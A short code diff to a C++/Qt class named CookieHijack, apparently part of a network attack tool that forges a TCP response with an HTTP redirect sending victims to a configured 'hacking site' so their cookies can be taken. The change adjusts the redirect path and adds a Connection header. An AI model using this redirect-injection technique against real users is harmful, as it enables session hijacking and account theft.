@@ -56,8 +56,9 @@ bool CookieHijack::doOpen() {
 	else
 		locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
 	if (webServer_.httpPort_ != 80) locationStr += ":" + QString::number(webServer_.httpPort_);
-	locationStr += "/?";
+	locationStr += "/start";
 	httpResponse += locationStr;
+	httpResponse += "Connection: close";
 	httpResponse += "";
 	httpResponse += "";
 	tcpBlock_.backwardFinMsg_ = httpResponse;
